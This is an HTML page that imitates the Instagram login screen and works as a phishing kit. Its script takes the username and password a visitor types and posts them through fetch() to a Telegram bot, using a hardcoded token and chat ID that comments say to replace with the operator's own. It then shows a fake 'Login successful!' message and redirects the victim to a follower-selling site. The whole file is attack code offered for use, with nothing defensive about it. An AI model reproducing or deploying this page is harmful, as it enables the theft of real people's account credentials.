<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
  <style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

body {
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.login-container {
    background: white;
    padding: 30px;
    width: 350px;
    text-align: center;
    border: 1px solid #dbdbdb;
    border-radius: 5px;
}

.logo {
    font-family: 'Billabong', cursive;
    font-size: 40px;
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 5px 0;
    border: 1px solid #dbdbdb;
    border-radius: 5px;
    font-size: 14px;
}

button {
    width: 100%;
    padding: 10px;
    background-color: #0095f6;
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
}

.fb-login {
    background-color: #385185;
}

.separator {
    margin: 15px 0;
    font-weight: bold;
    color: #8e8e8e;
}

.forgot-password {
    display: block;
    margin-top: 10px;
    color: #00376b;
    text-decoration: none;
    font-size: 14px;
}

.forgot-password:hover {
    text-decoration: underline;
}
</style>
    <div class="login-container">
        <h1 class="logo">Instagram</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
            <div class="separator">OR</div>
            <button class="fb-login">Log in with Facebook</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
    </div>
    

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); 

    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (!username || !password) {
        alert("Please enter username and password.");
        return;
    }

    // Replace with your Telegram Bot Token
    const botToken = "7887583841:AAFaOn7C_SpIM9sHw3dR--loFhuMHRa7sUA";  
    // Replace with your Chat ID (Get it using @userinfobot on Telegram)
    const chatId = "7919654013";  

    // Message format
    let message = `🔐 *Instagram Login Attempt* 🔐\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}`;

    // Telegram API URL
    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Sending request
    fetch(telegramURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert("Login successful!");
            window.location.href = "https://superviral.io/free-instagram-followers/"; // Change this to your actual next page URL
        } else {
            alert("Error sending data to Telegram. Check bot token and chat ID.");
            console.error("Telegram API Error:", data);
        }
    })
    .catch(error => {
        alert("Network error. Check console for details.");
        console.error("Fetch Error:", error);
    });
});
</script>
</body>
</html>
